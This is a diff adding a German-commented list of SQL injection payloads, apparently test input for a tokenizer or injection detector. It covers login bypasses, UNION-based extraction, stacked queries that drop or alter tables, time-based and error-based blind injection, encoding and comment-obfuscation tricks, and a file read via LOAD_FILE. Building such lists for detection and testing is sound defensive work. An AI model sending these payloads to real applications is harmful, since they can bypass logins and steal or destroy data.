@@ -1,0 +1,72 @@
+# sqli – Angriffs-Payloads (ein Payload pro Zeile; Kommentarzeilen beginnen mit #)
+# Hinweis: Platzhalter wie x-scr'ipt stehen für script-Varianten; der Tokenizer prüft die zusammengesetzten Formen.
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+' OR 'a'='a
+admin'--
+admin' #
+admin'/*
+' OR 1=1#
+1 OR 1=1
+1' AND 1=1--
+1' AND '1'='1
+' OR 1=1 LIMIT 1--
+') OR ('1'='1
+')) OR (('1'='1
+' or true--
+' or ''='
+" or ""="
+1' OR '1'='1' /*
+' UNION SELECT NULL--
+' UNION SELECT a,b FROM t--
+1 UNION ALL SELECT 1,2,3,4
+-1 UNION SELECT banner,2,3
+' UNION/**/SELECT/**/a,b/**/FROM/**/t--
+'/**/UNION/**/ALL/**/SELECT/**/1,2--
+1'/*!50000UNION*//*!50000SELECT*/1,2--
+' UnIoN SeLeCt 1,2,3--
+%27%20UNION%20SELECT%20NULL--
+%2527%2520OR%25201%253D1--
+1 /*!12345UNION*/ /*!12345SELECT*/ 1
+1; DROP TABLE t1--
+'; DROP TABLE t1; --
+1; DELETE FROM acct WHERE 1=1
+'; INSERT INTO t (n) VALUES ('x')--
+'; UPDATE t SET role='a' WHERE id=1--
+1' AND SLEEP(5)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR SLEEP(5)#
+1 AND BENCHMARK(5000000,MD5(1))
+'; WAITFOR DELAY '0:0:5'--
+1) OR pg_sleep(5)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT banner)))--
+' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--
+' AND (SELECT COUNT(*),CONCAT(banner,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a--
+' AND 1=CONVERT(int,(SELECT banner))--
+1 AND ASCII(SUBSTRING((SELECT db()),1,1))>64
+' AND SUBSTRING(banner,1,1)='5
+' OR EXISTS(SELECT * FROM t)--
+SELECT col FROM information_schema.tables
+' UNION SELECT a,NULL FROM information_schema.columns--
+1' ORDER BY 1--
+1' ORDER BY 10#
+1 GROUP BY 1,2,3--
+' HAVING 1=1--
+' UNION SELECT LOAD_FILE('/etc/hostname')--
+1' || (SELECT CHAR(65)||CHAR(66))--
+'||(SELECT banner)||'
+'+(SELECT TOP 1 name FROM sysobjects)+'
+' + CHAR(0x41) + '
+1 AND 1=1
+admin" --
+' AND @@version LIKE '%MariaDB%
+1'; SELECT pg_sleep(10)--
+' UNION SELECT NULL,NULL,NULL FROM DUAL--
+1%27%20AND%20%271%27%3D%271
+' AND CHAR(67,65,84)='CAT
+0x31 OR 0x31=0x31
+' oR/**/1=1#
+99999' or '1'='1'='1'='1
+' AND 1 IN (SELECT banner)--
+procedure analyse(extractvalue(1,concat(0x7e,version())),1)
